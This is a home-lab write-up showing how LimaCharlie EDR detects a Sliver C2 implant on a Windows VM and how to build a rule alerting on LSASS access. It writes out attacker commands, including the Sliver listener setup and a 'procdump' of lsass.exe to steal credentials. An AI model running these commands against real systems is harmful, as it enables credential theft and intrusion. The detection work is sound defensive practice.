<h1>LimaCharlie EDR - Using Telemetry to Detect and Alert about Dangerous payloads (C2 Command and Conquer Attacks)</h1>
This is a Follow up of a previous lab.

<h2>Description</h2>
Project consists of a simple LimaCharlie Home-Lab, being deployed to monitor and block possible C2 Attacks (Command and Control), conducted by unauthorized users or threat actors.
<br />


<h2>Environments Used </h2>

- <b>A Windows 11 22H1 Virtual Machine (Victim)</b> 
- <b>An Ubuntu Server 22.03 VM (Attacker)</b>


<h2>Procedure:</h2>

<b>From the Ubuntu Attacker VM.</b>

-Launch Sliver and initiate an HTTP listener (don't forget to elevate to super user --sudo su-- before launchin Sliver).
```
sudo su
sliver-server
http
```
<img src="https://imgur.com/6sIfYgQ.png" height="80%" width="80%"/>

<b>From the Windows VM.</b>
Launch our C2 Payload named: "APPLICABLE_SUBSTANCE.exe", from Windows Terminal, elevated as Administrator:

```
C:\Users\User\Downloads\APPLICABLE_SUBSTANCE.exe
```

<img src="https://imgur.com/mqPkbBm.png" height="80%" width="80%"/>

If you see this message from the Linux Ubuntu VM, it means our malicious payload is connected to the Sliver-Server, and ready to launch C2 attacks to Windows 11.


<b>From the Ubuntu Attacker VM.</b>

We can find out what user our Implant is running and confirm it's privileges, see which connections are in use, and check our current directory:

```
whoami
getprivs
netsat
pwd
```
All this noise is being detected by our EDR LimaCharlie Sensor.

<h4> Let's go back to our EDR Tool, Home-Lab-PTY</h4>
Here we can go to the Windows 11 Sensor, and filter by our payload's name.

A lot of hits should be found, with various types of details:
<img src="https://imgur.com/CZt3uCf.png" height="80%" width="80%" />

<br />
<b>Now let's Go Bback to our Ubuntu Attacker.</b>

<h3>Stealing Windows Passwods from our Sliver Server</h3>

From our Sliver Session, let's run:

```
procdump -n lsass.exe -s lsass.dmp
```
This commandwill copy\dump the remote process from memory, and save it locally on your Sliver C2 server. Please note, this process could take up to 5 minutes.

<img src="https://imgur.com/40wnAE1.png" height="80%" width="80%" />
lsass.exe, handles the Windows' Local Authentication system service, and it's the one in charge of handling credentials and authenticating users.


<b>Now let's Go Bback to our Endpoint Detection and Response tool, LimaCharlie.</b>

We are going to detect this stealing attempt:
 -Since lsass.exe is a known sensitive process often targeted by credential stealing attackers, any security tool should automatically raise flags for this.
 -We need to go back to our Windows Sensor, and filter the timeline by SENSITIVE_PROCESS_ACCESS.
 -This will reveal details about the recent attack we started:
 <img src="https://imgur.com/2UfKQtL.png" height="80%" width="80%" />
 
Pay attention to the highlighted lines, to see the Source, Destination, and binaries involved in this attack. This and much more is available, from our LimaCharlie EDR tool.

<h4>Time to Defend ourselves, using a Detection and Response Rule</h4>

Click here to Build a D&R rule out of this TimeLine Entry.
<img src="https://imgur.com/eBkJWo1.png" height="80%" width="80%" />

For the Detection YAML detection we will use:
```
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe
```
And the response will be tO:
```
- action: report
  name: LSASS accessed!
```

We’re telling LimaCharlie to simply generate a detection “report” anytime this detection occurs.

From here we may scroll down and click Test Event, and if it's green, go up again, and Save our new rule.
<img src="https://imgur.com/Ykc8YYd.png" height="80%" width="80%" />

Go back to the main menu, and go to the Detections tab.

Rerun the procdump command from Sliver Server, and our new Detection and Response Rule should be logged:

<img src="https://imgur.com/qAlSaof.png" height="80%" width="80%" />


<br />
<br />
Observe the wiped disk:  <br/>
<img src="https://i.imgur.com/AeZkvFQ.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
